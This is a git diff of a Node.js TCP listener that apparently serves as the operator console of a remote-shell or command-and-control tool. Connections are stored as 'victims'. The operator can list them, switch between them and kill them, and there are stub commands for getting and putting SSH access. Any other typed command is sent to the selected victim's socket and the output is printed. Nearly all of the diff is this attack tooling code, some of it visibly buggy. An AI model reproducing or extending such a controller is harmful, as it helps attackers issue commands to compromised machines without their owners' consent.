@@ -1,5 +1,5 @@
 #!/usr/bin/env node
-'use strict';
+//'use strict';
 
 const net = require('net');
 
@@ -34,7 +34,7 @@ let i = 0;
 function initVictim(socket) {
     
     let _id = (++i) + "_" + socket.remotePort;
-
+    
     // each socket object is unique
     serverList[_id] = {
 	id: _id,
@@ -53,7 +53,7 @@ function initVictim(socket) {
 
 const tcpServer = net.createServer((socket) => {
     
-    let socketList;
+    var socketList;
     let sock;
     let {localAddress,localPort,remoteAddress,remotePort} = socket;
     console.log(`\nsending new connection from ${localAddress}:${localPort} to ${remoteAddress}:${remotePort}`);
@@ -77,9 +77,10 @@ const tcpServer = net.createServer((socket) => {
 	if ( data === null )  return ;
 
 	let cmd =  /([a-z]+)?/.exec(data)[1];
-
-	switch (cmd) {
+	
+	if ( ! cmd  ) return prompt.prompt();
 	    
+	switch (cmd) {
 	case "switch":
 	    let getUserToSwitch = data.split(" ")[1].trim();
 	    
@@ -108,14 +109,13 @@ const tcpServer = net.createServer((socket) => {
 	case 'list':
 	    
 	    let objNames = Object.getOwnPropertyNames(socketList);
-	    
+	    console.log(objNames);
 	    let i = 0;
-
 	    
 	    objNames.forEach((sockets) => {
 		let {id, port, address, localPort, localAddress} = socketList[sockets];
 		process.stdout.write(`${(++i)} ${localAddress}:${localPort} --> ${address}:${port}\n`);
-
+		
 	    });
 	    prompt.prompt();
 	    break;
@@ -127,27 +127,90 @@ const tcpServer = net.createServer((socket) => {
 
 	    
 	    break;
-	case 'create_service':
+	case 'createservice':
 	    sock = currentClient["sock"];
 	    break;
-	case 'get_ssh':
+	case 'getssh':
 	    sock = currentClient["sock"];
 	    break;
-	case 'put_ssh':
+	case 'putssh':
 	    sock = currentClient["sock"];
 	    break;
-	case 'open_ssh_session':
-	    sock = currentClient["sock"];
-	    break;
-	case 'kill_client':
-	    sock = currentClient["sock"];
-	default:
+	case 'opensshsession':
+	    
 	    sock = currentClient["sock"];
 	    
+	    break;
+	    
+	case 'killclient':
 
-	    sock.write(data)
+	    
+	    let { id , port , address} = currentClient;
+	    
+	    let getIdNum = id.match(/^(\d+)/)[1];
+	    
+	    let getPreviousClient = Number(getIdNum) - 1;
+
+	    let getNextClient = Number(getIdNum) + 1;
+
+	    //delete socketList[currentClient]; // i can't tell why this does not work o.O
+
+	    delete serverList[currentClient];
+	    
+	    if ( getPreviousClient !== 0 ) {
+				
+		let userRegexp = new RegExp(`^(${getPreviousClient}){1,}`);
+		
+
+		currentClient = Object.keys(socketList).filter(( l ) => userRegexp.test(l) );
+
+		currentClient = socketList[currentClient];
+		
+		prompt.setPrompt({ id, port, address} = currentClient);
+
+		prompt.prompt();
+
+		return ;
+		// get the next client if there is really one
+	    } else if (
+		Object.keys(socketList).filter( l => new RegExp(`^(${getNextClient}){1,}`).test(l) ).length !== 0 ) {
+		
+		currentClient = Object.keys(socketList).filter( l => new RegExp(`^(${getNextClient}){1,}`).test(l) );
+		
+		currentClient = socketList[currentClient];
+		
+		prompt.setPrompt({id, port, address} = currentClient);
+
+		prompt.prompt();
+
+		return ;
+		
+	    }
+
+
+	    id = port = address = '**';
+
+
+	    currentClient = undefined;
+	    process.stdout.write('no active connection now\n');
+	    prompt.setPrompt({id,port,address});
+	    prompt.prompt();
+	    break;
+	    
+	default:
+
+	    try {
+		sock = currentClient["sock"];
+	    } catch ( ex ) {
+		process.stdout.write(color.red('no active connection') + '\n');
+		return prompt.prompt();
+	    }
+	    
+	    
+	    sock.write(data);
 	    
 	    sock.on('data', ( data ) => {
+		
 		process.stdout.write(data);
 		prompt.prompt();
 	    });
